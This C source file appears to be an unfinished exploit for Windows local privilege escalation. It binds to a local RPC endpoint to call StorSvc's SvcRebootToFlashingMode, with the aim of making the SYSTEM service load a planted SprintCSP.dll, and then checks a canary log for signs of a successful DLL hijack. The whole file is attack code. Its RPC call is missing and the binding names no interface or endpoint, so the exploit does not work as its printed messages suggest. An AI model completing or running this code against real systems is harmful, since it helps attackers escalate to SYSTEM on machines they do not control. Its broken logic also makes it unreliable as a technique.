#include <windows.h>
#include <stdio.h>

// StorSvc RPC interface - SvcRebootToFlashingMode
// UUID: BE7F785E-0E3A-4AB7-91DE-7E46E443BE29
// This calls into StorSvc which triggers LoadLibrary("SprintCSP.dll")

typedef HRESULT (WINAPI *pSvcRebootToFlashingMode)(HANDLE hBinding);

// Use RPC to call StorSvc
#pragma comment(lib, "rpcrt4.lib")

int main(void) {
    printf("[*] StorSvc RPC trigger - SvcRebootToFlashingMode\n");
    printf("[*] This triggers LoadLibrary(\"SprintCSP.dll\") in StorSvc (SYSTEM)\n\n");
    
    // Try via COM/RPC
    RPC_WSTR binding = NULL;
    RPC_STATUS status;
    RPC_BINDING_HANDLE hBinding = NULL;
    
    // Compose binding string for local ALPC endpoint
    status = RpcStringBindingComposeW(
        NULL, // no UUID needed
        (RPC_WSTR)L"ncalrpc",
        NULL, // local
        (RPC_WSTR)L"", // endpoint auto-resolved
        NULL,
        &binding
    );
    
    if (status != RPC_S_OK) {
        printf("[-] RpcStringBindingCompose failed: %lu\n", status);
        return 1;
    }
    
    printf("[+] Binding: %ls\n", binding);
    
    status = RpcBindingFromStringBindingW(binding, &hBinding);
    RpcStringFreeW(&binding);
    
    if (status != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBinding failed: %lu\n", status);
        return 1;
    }
    
    printf("[+] RPC binding created\n");
    printf("[*] Attempting to call SvcRebootToFlashingMode...\n");
    printf("[*] (If CVE-2023-21746 is patched, this may fail)\n");
    
    // The actual RPC call would go here, but we need the exact IDL
    // For now, let's try a simpler approach - force StorSvc restart
    printf("[*] Note: Full RPC client requires StorSvc IDL definition\n");
    printf("[*] Checking if SprintCSP.dll was loaded by monitoring canary...\n");
    
    RpcBindingFree(&hBinding);
    
    // Check canary
    HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\vader_path_hijack.log",
        GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char buf[2048] = {0};
        DWORD read;
        ReadFile(hFile, buf, sizeof(buf)-1, &read, NULL);
        CloseHandle(hFile);
        if (read > 0) {
            printf("\n[!!!] CANARY FOUND:\n%s\n", buf);
        } else {
            printf("\n[-] Canary file empty\n");
        }
    } else {
        printf("\n[-] No canary file yet\n");
    }
    
    return 0;
}